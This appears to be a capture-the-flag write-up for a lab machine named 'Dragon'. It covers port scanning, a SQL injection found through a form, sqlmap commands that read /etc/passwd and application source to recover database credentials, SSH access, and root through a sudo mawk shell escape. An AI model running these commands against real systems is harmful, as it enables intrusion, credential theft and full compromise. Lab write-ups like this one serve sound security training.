
# Dragon — Writeup
<img width="1442" height="813" alt="Screenshot From 2026-03-05 16-34-29" src="https://github.com/user-attachments/assets/130b5e67-1940-44b0-8067-c5efe7b9baa0" />


**Category:** Web, Linux, Privilege Escalation  
**Difficulty:** Easy

Machines can be solved in any order, but I decided to start with the first one in the list called **Dragon**.

Based on the task description, we can already assume the following:

- There is a **web application**
- The server runs **Linux**
- We will need to perform **privilege escalation**

Let's start the machine and begin the attack.

---

# Reconnaissance

As usual, everything starts with reconnaissance.

We can scan the target using tools like **nmap** or **rustscan**. In this task, I used **nmap** with the following flags:

- `-sC` — run default scripts to detect common misconfigurations
- `-sV` — detect service versions
- `-vv` — increase verbosity

```bash
sudo nmap -sC -sV -vv 10.10.10.57
```

Output:

```bash
Not shown: 998 closed tcp ports (reset)

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 7
80/tcp open  http    nginx
```

From the scan results we can see:

- **22/tcp — SSH**
- **80/tcp — HTTP (nginx)**

So our main attack surface will likely be the **web application**.

---

# Exploring the Website

Visiting the website:

```
http://10.10.10.57/
```

We see a **single-page site** with a form where users can submit an application.

A good habit during web testing is always to check the **page source**, since developers sometimes leave hidden comments or hints there.

In this case, the source code didn't reveal anything useful.

However, since the page contains **input fields**, we can try various injection attacks.

---

# Testing for SSTI

I initially tested for **Server-Side Template Injection (SSTI)**.

If the payload:

```
{{7*7}}
```

returns `49`, the template engine is vulnerable.

Instead I received the following response using curl:

```bash
curl -X POST http://10.10.10.57/index.php -d "name=%7B%7B7*7%7D%7D&phone=%7B%7B7*7%7D%7D&email=123%40test&message=%7B%7B7*7%7D%7D&event-date=2026-02-25&submit_application=1"
```

Response:

```
<!-- SQLMAP DEBUG: Success -->
```

This immediately suggests a **possible SQL injection vulnerability**.

---

# Exploiting SQL Injection

To automate the exploitation process, I used **SQLMap**.

```bash
sqlmap -u "http://10.10.10.57/index.php" --data "name=%7B%7B7*7%7D%7D&phone=%7B%7B7*7%7D%7D&email=123%40test&message=%7B%7B7*7%7D%7D&event-date=2026-02-25&submit_application=1" --dbs
```

Explanation:

- `--data` — raw POST request parameters
- `--dbs` — enumerate available databases

Result:

```
(custom) POST parameter '#2*' is vulnerable. Do you want to keep testing the others (if any)? [y/N]
...
[07:13:35] [INFO] retrieved: 'information_schema'
[07:13:35] [INFO] retrieved: 'dragon'
available databases [2]:
[*] dragon
[*] information_schema
```

---

# Enumerating Tables

Next step: enumerate tables in the `dragon` database.

```bash
sqlmap -D dragon --tables
```

Result:

```sql
Database: dragon
[4 tables]
+--------------+
| applications |
| search_data  |
| search_logs  |
| users        |
+--------------+
```

---

# Dumping the Users Table

```bash
sqlmap -D dragon -T users --dump
```

Result:

```sql
[07:30:04] [WARNING] table 'users' in database 'dragon' appears to be empty
Database: dragon
Table: users
[0 entries]
+----+-------+--------+----------+------------+
| id | email | name   | password | created_at |
+----+-------+--------+----------+------------+
+----+-------+--------+----------+------------+
```
<img width="1000" height="562" alt="What a twist!" src="https://github.com/user-attachments/assets/e24d1136-d992-490c-9147-c32548c7e0e4" />


No credentials here, so another path is required.

---

# Checking Database Privileges

SQLMap can also enumerate database user privileges.

```bash
sqlmap --privileges
```

Result:

```
database user: khomyachok@localhost
privilege: FILE
```

The **FILE privilege** allows reading files from the server filesystem.

---

# Reading System Files

Test reading `/etc/passwd`:

```bash
sqlmap --file-read="/etc/passwd"
```

Output confirms file read access.

---

# Reading Web Application Source

Next I retrieved the web application source code:

```bash
sqlmap --file-read="/var/www/html/index.php"
```

Important part:

```php
$db_user = 'khomyachok';
$db_pass = 'dXNlcnBhc3MhODkw';
$db_name = 'dragon';
```

Credentials found inside the application source code.

---

# Initial Access

Using the discovered credentials:

```bash
ssh khomyachok@10.10.10.57
```

Login succeeds and we obtain the **user flag**.
<img width="1920" height="1080" alt="Screenshot_2026-02-24_08_13_24" src="https://github.com/user-attachments/assets/15049070-a1c8-4472-913d-e925929da84c" />

---

# Privilege Escalation

Checking sudo permissions:

```bash
sudo -l
```

Output:

```
(root) NOPASSWD: /usr/bin/mawk
```

The user can run **mawk as root without a password**.

---

# GTFOBins

The GTFOBins project documents how common Linux binaries can be abused for privilege escalation:

https://gtfobins.github.io

For `mawk` the following payload is available:

```bash
sudo mawk 'BEGIN {system("/bin/sh")}'
```

---

# Root Access

After running the command:

```bash
id
```

```
uid=0(root) gid=0(root)
```

Root shell obtained.

Finally:

```bash
cat /root/root
```

Root flag captured.
